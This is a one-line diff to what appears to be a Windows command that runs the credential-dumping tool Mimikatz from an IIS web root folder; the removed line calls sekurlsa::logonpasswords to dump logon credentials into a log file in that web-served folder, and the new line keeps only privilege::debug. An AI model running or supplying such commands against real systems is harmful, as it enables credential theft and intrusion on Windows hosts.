@@ -1,1 +1,1 @@
-c:\Inetpub\wwwroot\inputToWeb\test\mimikatz.exe privilege::debug sekurlsa::Minidump sekurlsa::logonpasswords > c:\Inetpub\wwwroot\inputToWeb\test\log.txt
+c:\Inetpub\wwwroot\inputToWeb\test\mimikatz.exe privilege::debug > c:\Inetpub\wwwroot\inputToWeb\test\log.txt
